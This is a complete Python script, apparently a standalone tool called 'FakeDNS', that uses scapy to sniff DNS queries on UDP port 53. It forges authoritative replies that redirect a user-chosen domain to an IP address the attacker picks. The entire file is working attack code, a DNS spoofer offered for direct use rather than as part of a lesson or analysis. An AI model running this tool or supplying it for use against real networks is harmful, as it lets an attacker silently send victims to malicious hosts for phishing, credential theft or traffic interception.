#FakeDNS
# you need root to run FakeDNS

from scapy.all import *
import sys

WHITE = "\033[97m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"  

def get_domain_and_ip():
    domain = input(f"{CYAN}Enter the domain you want to spoof (e.g., example.com): {RESET}")
    new_ip = input(f"{CYAN}Enter the IP address to redirect {domain} to: {RESET}")
    return domain, new_ip

def dns_spoof(packet, target_domain, fake_ip):
    if packet.haslayer(DNSQR):
        qname = packet[DNSQR].qname.decode()
        
        if target_domain in qname:
            print(f"{GREEN}[+] Spoofing DNS query: {qname} -> {fake_ip}{RESET}")
            
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                              an=DNSRR(rrname=qname, ttl=60, rdata=fake_ip))
            send(spoofed_pkt, verbose=False)

def main():
    print(f"{YELLOW}Welcome to DNS Spoofer Tool!{RESET}")
    target_domain, fake_ip = get_domain_and_ip()

    print(f"{CYAN}[+] Starting DNS query interception for domain: {target_domain}{RESET}")
    
    sniff(filter="udp port 53", prn=lambda packet: dns_spoof(packet, target_domain, fake_ip), store=0)

if __name__ == "__main__":
    main()
